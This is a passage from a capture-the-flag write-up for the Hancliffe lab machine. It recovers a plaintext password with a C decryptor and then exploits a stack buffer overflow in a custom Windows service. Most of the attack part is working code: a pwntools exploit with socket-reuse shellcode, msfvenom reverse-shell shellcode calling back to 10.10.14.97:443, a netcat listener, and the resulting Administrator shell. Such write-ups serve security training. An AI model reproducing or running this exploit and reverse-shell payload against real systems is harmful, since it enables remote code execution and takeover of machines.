      data_buf[i] = data_buf[i] + 0x5e;
    data_buf[i] = data_buf[i] - 0x2f;
    i = i + 1;
  }
  return data_buf;
}
```

### `encrypt2`

`encrypt2(data, len_data)` works via the following algorithm: for every character in `data` (assume in the printable ASCII range if passed from `encrypt1()`), if the character isn't a letter, keep it. If it is a letter, transform it into the letter at the same offset of the flipped alphbet (`A` into `Z`, `B` into `Y`, etc.). This algorithm conveiniently reverses itself, so `encrypt2()` can be used to decrypt ciphertext from itself.

### Reversing the Password

FIrst, base64-decode `YXlYeDtsbD98eDtsWms5SyU=`: `ayXx;ll?|x;lZk9K%`. Pass this through `encrypt2()` and `decrypt1()` to recover the plaintext password.

```c
// hancliffe-decryptor.c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <stdbool.h>

char *decrypt1(char *encrypted_data) {
  char *data_buf = strdup(encrypted_data);
  unsigned int len_data_buf = strlen(data_buf);
  unsigned int i = 0;
  while (i < len_data_buf) {
    if ((int)data_buf[i] + 0x5e <= 173)
      data_buf[i] = data_buf[i] + 0x5e;
    data_buf[i] = data_buf[i] - 0x2f;
    i = i + 1;
  }
  return data_buf;
}

char *encrypt2(char *data, int len_data) {
  char *data_buf;
  char current_byte;
  int i;
  bool is_uppercase;
  data_buf = strdup(data);
  i = 0;
  while (i < len_data) {
    current_byte = data[i];
    if ((current_byte < 0x41) ||
       (((0x5a < current_byte && (current_byte < 0x61)) || (0x7a < current_byte)))) {
      data_buf[i] = current_byte;
    }
    else {
      is_uppercase = current_byte < 0x5b;
      if (is_uppercase) {
        current_byte = current_byte + 0x20;
      }
      data_buf[i] = 'z' - (current_byte + 0x9f);
      if (is_uppercase) {
        data_buf[i] = data_buf[i] + -0x20;
      }
    }
    i = i + 1;
  }
  return data_buf;
}


int main(int argc, char *argv[]) {
  if (argc == 2) {
    char *decrypted = decrypt1(encrypt2(argv[1], strlen(argv[1])));
    printf("[*] %s decrypted: %s\n", argv[1], decrypted);
    return 0;
  }
  else {
    printf("[!] Usage: %s $DATA", argv[0]);
    return 1;
  }
}
```

`alfiansyah`'s password is `K3r4j@@nM4j@pAh!T`.

```bash
$ gcc -m32 hancliffe-decryptor.c -o hancliffe-decryptor
$ ./hancliffe-decryptor 'ayXx;ll?|x;lZk9K%'
[*] ayXx;ll?|x;lZk9K% decrypted: K3r4j@@nM4j@pAh!T
```

This credential makes it possible to successfully authenticate. However, the server then prompts for a full name and a code, which is unknown.

```bash
$ nc -v hancliffe.htb 9999
hancliffe.htb [10.129.96.116] 9999 (?) open
Welcome Brankas Application.
Username: alfiansyah
Password: K3r4j@@nM4j@pAh!T
Login Successfully!
FullName: tgihf
Input Your Code: 1234
Wrong Code
```

---

## `MyFirstApp` Buffer Overflow

The source code that processes the input code appears to be vulnerable to a stack-based buffer overflow. It passes the input code into the `Save_Creds()` function, which writes the input code into a 50-byte, stack-allocated buffer. A code larger than this overflows the buffer and overwrites values on the stack.

```c
void __cdecl _SaveCreds(char *param_1,char *param_2)

{
  char local_42 [50];
  char *local_10;
  
  local_10 = (char *)_malloc(100);
  _strcpy(local_10,param_2);
  _strcpy(local_42,param_1);
  return;
}
```

After successfully overwriting EIP, the exploit outlook is quite grim. ESP points to the last 10 bytes of the input code, necessitating a jump to a larger controllable portion of memory to do anything remotely useful. It is possible to jump backwards to the first 66 bytes the input code, or, if the full name input is less than 100 bytes, jump ahead to it. The latter option grants more room to work with, so go with it.

A bit less than 100 bytes still isn't quite enough for useful shellcode. However, at this point during `MyFirstApp`'s execution, it hasn't yet closed its socket. It made calls to [recv](https://docs.microsoft.com/en-us/windows/win32/api/winsock/nf-winsock-recv) earlier. These mean that the socket can be reused in a call to [recv](https://docs.microsoft.com/en-us/windows/win32/api/winsock/nf-winsock-recv) to stage an arbitrary sized payload. In exploit development, this is often referred to as [socket reuse](https://rastating.github.io/using-socket-reuse-to-exploit-vulnserver/).

[recv](https://docs.microsoft.com/en-us/windows/win32/api/winsock/nf-winsock-recv) takes the file descriptor of the socket, the address of where to begin writing received data to, the number of bytes to write, and a flag integer.

```c++
int recv(
  [in]  SOCKET s,
  [out] char   *buf,
  [in]  int    len,
  [in]  int    flags
);
```

The `flags` integer will be 0.

A reverse shell payload is smaller than 500 bytes, so `len` will be 500.

After jumping to the section of memory containing the `FullName` input, EIP is equal to ESP. For `buf`, calculate an offset from ESP that gives enough room to make the [recv](https://docs.microsoft.com/en-us/windows/win32/api/winsock/nf-winsock-recv) call and stage the additional shellcode just after it. That way, after the [recv](https://docs.microsoft.com/en-us/windows/win32/api/winsock/nf-winsock-recv) call finishes, the additional shellcode will be executed. This will be ESP + 28.

Comparing the legitimate calls to [recv](https://docs.microsoft.com/en-us/windows/win32/api/winsock/nf-winsock-recv) with the registers at the time of the EIP overwrite, it appears the socket file descriptor is already stored in EBX. So `s` will be the value already stored in EBX.

Push these arguments on the stack in this order.

Lastly, the address of [recv](https://docs.microsoft.com/en-us/windows/win32/api/winsock/nf-winsock-recv) will need to be stored in EAX and then called. According to the debugger, the address of the address of [recv](https://docs.microsoft.com/en-us/windows/win32/api/winsock/nf-winsock-recv) appears to be 0x719082ac. At runtime, the value at this address will be the address of the [recv](https://docs.microsoft.com/en-us/windows/win32/api/winsock/nf-winsock-recv) function.

![](images/Pasted%20image%2020220308155038.png)

![](images/Pasted%20image%2020220308155156.png)

Generate a 32-bit Windows reverse shell payload and put it all together in an exploit.

```python
from pwn import *
import sys
import struct
import time


if len(sys.argv) < 3:
    print(f"[!] Usage: {sys.argv[0]} $RHOST $RPORT")
    sys.exit(1)

for _ in range(5):
    try:
        io = remote(sys.argv[1], sys.argv[2])
        io.recvline()
        io.recv(10)

        username = b"alfiansyah"
        password = b"K3r4j@@nM4j@pAh!T"
        print(f"[*] Connected! Logging in with credentials {username.decode()}:{password.decode()}...")
        io.sendline(username)
        io.recv(10)
        io.sendline(password)
        io.recvline()
        io.recv(10)

        print(f"[*] Sending FullName with payload to set up recv() call...")
        full_name = b"\x8b\x2c\x24"                 # mov ebp, [esp] -> saving current address in ebp
                                                    # so we can stage additional shellcode via recv()

        # push flags (0)
        full_name += b"\x31\xc9"                    # xor ecx, ecx
        full_name += b"\x51"                        # push ecx

        # push number of bytes to read from socket (500)
        full_name += b"\x66\xb9\xf4\x01"            # mov cx, 500
        full_name += b"\x51"                        # push ecx

        # push address of buffer to write to (ebp + 28)
        full_name += b"\x66\x83\xc5\x1c"            # add bp, 28
        full_name += b"\x55"                        # push ebp

        # push socket file descriptor (already in ebx at this point)
        full_name += b"\x53"                        # push ebx

        # call recv(ebx, ebp + 28, 500, 0)
        full_name += b"\xb8\xac\x82\x90\x71"        # mov eax, 0x719082ac (address of &recv() call)
        full_name += b"\xff\x10"                    # call [eax]

        full_name += b"\x90" * (95 - len(full_name))
        io.sendline(full_name)
        io.recv(17)

        print(f"[*] FullName sent! Sending code to overflow the stack and direct EIP to recv() call...")
        eip_offset = 66
        code  = b"A" * eip_offset
        code += p32(0x719023c3)                     # address of jmp esp instruction
        code += b"\x83\xC4\x38"                     # add esp, 56
        code += b"\xFF\x24\x24"                     # jmp [esp]
        io.sendline(code)

        time.sleep(2)

        # msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.97 LPORT=443 EXITFUNC=thread -f python -b '\x00\x0a\0x0d'
        buf =  b""
        buf += b"\x33\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0\x5e\x81"
        buf += b"\x76\x0e\xac\xaa\xaf\x82\x83\xee\xfc\xe2\xf4\x50\x42"
        buf += b"\x2d\x82\xac\xaa\xcf\x0b\x49\x9b\x6f\xe6\x27\xfa\x9f"
        buf += b"\x09\xfe\xa6\x24\xd0\xb8\x21\xdd\xaa\xa3\x1d\xe5\xa4"
        buf += b"\x9d\x55\x03\xbe\xcd\xd6\xad\xae\x8c\x6b\x60\x8f\xad"
        buf += b"\x6d\x4d\x70\xfe\xfd\x24\xd0\xbc\x21\xe5\xbe\x27\xe6"
        buf += b"\xbe\xfa\x4f\xe2\xae\x53\xfd\x21\xf6\xa2\xad\x79\x24"
        buf += b"\xcb\xb4\x49\x95\xcb\x27\x9e\x24\x83\x7a\x9b\x50\x2e"
        buf += b"\x6d\x65\xa2\x83\x6b\x92\x4f\xf7\x5a\xa9\xd2\x7a\x97"
        buf += b"\xd7\x8b\xf7\x48\xf2\x24\xda\x88\xab\x7c\xe4\x27\xa6"
        buf += b"\xe4\x09\xf4\xb6\xae\x51\x27\xae\x24\x83\x7c\x23\xeb"
        buf += b"\xa6\x88\xf1\xf4\xe3\xf5\xf0\xfe\x7d\x4c\xf5\xf0\xd8"
        buf += b"\x27\xb8\x44\x0f\xf1\xc2\x9c\xb0\xac\xaa\xc7\xf5\xdf"
        buf += b"\x98\xf0\xd6\xc4\xe6\xd8\xa4\xab\x55\x7a\x3a\x3c\xab"
        buf += b"\xaf\x82\x85\x6e\xfb\xd2\xc4\x83\x2f\xe9\xac\x55\x7a"
        buf += b"\xd2\xfc\xfa\xff\xc2\xfc\xea\xff\xea\x46\xa5\x70\x62"
        buf += b"\x53\x7f\x38\xe8\xa9\xc2\xa5\x88\xa2\xcb\xc7\x80\xac"
        buf += b"\xab\x14\x0b\x4a\xc0\xbf\xd4\xfb\xc2\x36\x27\xd8\xcb"
        buf += b"\x50\x57\x29\x6a\xdb\x8e\x53\xe4\xa7\xf7\x40\xc2\x5f"
        buf += b"\x37\x0e\xfc\x50\x57\xc4\xc9\xc2\xe6\xac\x23\x4c\xd5"
        buf += b"\xfb\xfd\x9e\x74\xc6\xb8\xf6\xd4\x4e\x57\xc9\x45\xe8"
        buf += b"\x8e\x93\x83\xad\x27\xeb\xa6\xbc\x6c\xaf\xc6\xf8\xfa"
        buf += b"\xf9\xd4\xfa\xec\xf9\xcc\xfa\xfc\xfc\xd4\xc4\xd3\x63"
        buf += b"\xbd\x2a\x55\x7a\x0b\x4c\xe4\xf9\xc4\x53\x9a\xc7\x8a"
        buf += b"\x2b\xb7\xcf\x7d\x79\x11\x4f\x9f\x86\xa0\xc7\x24\x39"
        buf += b"\x17\x32\x7d\x79\x96\xa9\xfe\xa6\x2a\x54\x62\xd9\xaf"
        buf += b"\x14\xc5\xbf\xd8\xc0\xe8\xac\xf9\x50\x57"

        buf += b"\xcc" * (500 - len(buf))
        io.sendline(buf)
    except EOFError:
        time.sleep(0.5)
    else:
        break
```

Start a reverse shell listener and fire the exploit.

```bash
$ python3 exploit.py hancliffe.htb 9999
[+] Opening connection to hancliffe.htb on port 9999: Done
[*] Connected! Logging in with credentials alfiansyah:K3r4j@@nM4j@pAh!T...
[*] Sending FullName with payload to set up recv() call...
[*] FullName sent! Sending code to overflow the stack and direct EIP to recv() call...
[*] Closed connection to hancliffe.htb port 9999
```

Receive a reverse shell as `Administrator`. Read the system flag at `C:\Users\Administrator\Desktop\root.txt`.

```bash
$ sudo nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.14.97] from (UNKNOWN) [10.129.248.156] 57649
Microsoft Windows [Version 10.0.19043.1266]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
hancliffe\administrator

C:\Windows\system32>dir C:\Users\Administrator\Desktop\root.txt
dir C:\Users\Administrator\Desktop\root.txt
 Volume in drive C has no label.
 Volume Serial Number is B0F6-2F1B

 Directory of C:\Users\Administrator\Desktop

03/08/2022  10:52 AM                34 root.txt
               1 File(s)             34 bytes
               0 Dir(s)   5,650,927,616 bytes free
```
